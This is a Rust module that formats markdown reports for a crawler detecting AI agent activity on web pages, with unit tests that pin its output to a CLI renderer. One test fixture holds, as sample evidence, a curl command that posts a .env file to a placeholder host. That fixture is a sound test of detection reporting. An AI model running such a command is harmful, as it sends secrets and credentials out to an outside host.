//! Markdown for findings. Level-one text comes straight from the crawler's
//! sink so both writers stay byte-identical; the serious report is a copy of
//! `cn_swarms::sink::render(.., true, ..)` adapted to database inputs (the
//! test below pins the two together).

use cn_swarms::{jev::Screening, judge::Judgment, sink};

/// Header written when a level-one finding is first created.
pub fn level_one_header(final_url: &str, fetched_at: &str) -> String {
    sink::level_one_header(&final_url, fetched_at)
}

/// One Jev section, appended on every flagged chunk.
pub fn level_one_section(screening: &Screening) -> String {
    sink::level_one_section(screening)
}

/// Inputs for a serious report. `archive` is not represented: the CLI points at
/// `../pages/<id>.txt` files, which Postgres does not write, so that line is omitted.
#[derive(Debug, Clone, Copy)]
pub struct ReportInput<'a> {
    /// Final URL when fetched, otherwise the queued URL.
    pub source: &'a str,
    pub seed: &'a str,
    pub disposition: &'a str,
    /// `(fetched_at, http_status)` when a page was fetched.
    pub fetched: Option<(&'a str, u16)>,
    pub judgments: &'a [Judgment],
    pub errors: &'a [String],
    pub report_threshold: f64,
}

/// Serious-report markdown: only review judgments that clear `report_threshold`.
pub fn serious_report(input: &ReportInput<'_>) -> String {
    let mut md = format!(
        "# Serious agent activity report\n\nSource: {}\n\nSeed: {}\n\nDisposition: {}\n\n",
        input.source, input.seed, input.disposition
    );
    if let Some((fetched_at, status)) = input.fetched {
        md.push_str(&format!("Fetched: {fetched_at} (HTTP {status})\n\n"));
    }
    md.push_str("This is a model assessment of archived web evidence. Claims on a page may require independent corroboration.\n\n");
    for j in input.judgments {
        if !(j.stage == "review" && j.verdict.report(input.report_threshold)) {
            continue;
        }
        md.push_str(&format!(
            "## {} — chunk {}\n\nModel: {}\n\nClassification: {:?}\n\nActivity: {:.2}; seriousness: {:.2}; confidence: {:.2}\n\n{}\n\n### Evidence\n\n",
            j.stage,
            j.chunk,
            j.model,
            j.verdict.classification,
            j.verdict.activity,
            j.verdict.seriousness,
            j.verdict.confidence,
            j.verdict.summary
        ));
        for quote in &j.verdict.evidence {
            for line in quote.lines() {
                md.push_str(&format!("> {line}\n"));
            }
            md.push('\n');
        }
        md.push_str("### Uncertainties and alternatives\n\n");
        for item in &j.verdict.uncertainties {
            md.push_str(&format!("- {item}\n"));
        }
        md.push('\n');
    }
    if !input.errors.is_empty() {
        md.push_str("## Incomplete processing\n\n");
        for error in input.errors {
            md.push_str(&format!("- {error}\n"));
        }
    }
    md
}

#[cfg(test)]
mod tests {
    use super::*;
    use cn_swarms::{
        crawl::Job,
        judge::{Classification, Verdict},
        sink::{Record, render},
    };
    use serde_json::Value;
    use url::Url;

    fn judgment(confirmed: bool, seriousness: f64) -> Judgment {
        Judgment {
            stage: "review".into(),
            chunk: 3,
            requested_model: "provider/strong".into(),
            model: "provider/strong".into(),
            usage: Value::Null,
            verdict: Verdict {
                activity: 0.91,
                seriousness,
                confidence: 0.88,
                classification: Classification::SuspectedUnauthorized,
                summary: "Agent exfiltrated keys.".into(),
                evidence: vec!["curl -d @.env\nhttps://x.test".into()],
                uncertainties: vec!["No corroboration of identity.".into()],
                confirmed_serious: confirmed,
            },
        }
    }

    #[test]
    fn level_one_header_matches_legacy_literal() {
        assert_eq!(
            level_one_header("https://a.test/x", "2026-10-07T01:02:03+00:00"),
            "# Level-one agent activity finding\n\nSource: https://a.test/x\n\nFetched: 2026-10-07T01:02:03+00:00\n\nStrong-model review pending.\n\n"
        );
    }

    #[test]
    fn level_one_section_matches_legacy_literal() {
        let screening = Screening {
            chunk: 2,
            requested_model: "jev-latest".into(),
            model: "jev-latest".into(),
            usage: Value::Null,
            importance: 0.8,
            agent_activity: 0.5,
            potentially_serious: 0.125,
        };
        assert_eq!(
            level_one_section(&screening),
            "## Jev — chunk 2\n\nModel: jev-latest\n\nImportance probability: 80.00%\n\nAgent activity probability: 50.00%\n\nPotentially serious probability: 12.50%\n\n"
        );
    }

    #[test]
    fn serious_report_matches_cli_render_without_page() {
        let url = Url::parse("https://a.test/x").unwrap();
        let judgments = vec![judgment(true, 0.95), judgment(false, 0.2)];
        let errors = vec!["review chunk 4: timeout".to_owned()];
        let record = Record {
            job: Job {
                url: url.clone(),
                seed: url.clone(),
                parent: None,
                depth: 0,
            },
            page: None,
            judgments: judgments.clone(),
            screenings: vec![],
            errors: errors.clone(),
            disposition: "triage_error".into(),
            skip_reason: None,
        };
        let cli = render(&record, true, 0.8);
        let ours = serious_report(&ReportInput {
            source: url.as_str(),
            seed: url.as_str(),
            disposition: "triage_error",
            fetched: None,
            judgments: &judgments,
            errors: &errors,
            report_threshold: 0.8,
        });
        assert_eq!(ours, cli);
        assert!(ours.contains("## review — chunk 3"));
        assert!(!ours.contains("chunk 3\n\nModel: provider/strong\n\nClassification: Unclear"));
    }

    #[test]
    fn serious_report_skips_judgments_below_threshold() {
        let judgments = vec![judgment(true, 0.5)];
        let md = serious_report(&ReportInput {
            source: "https://a.test/",
            seed: "https://a.test/",
            disposition: "reviewed",
            fetched: Some(("2026-10-07T00:00:00+00:00", 200)),
            judgments: &judgments,
            errors: &[],
            report_threshold: 0.8,
        });
        assert!(md.contains("Fetched: 2026-10-07T00:00:00+00:00 (HTTP 200)"));
        assert!(!md.contains("### Evidence"));
    }
}
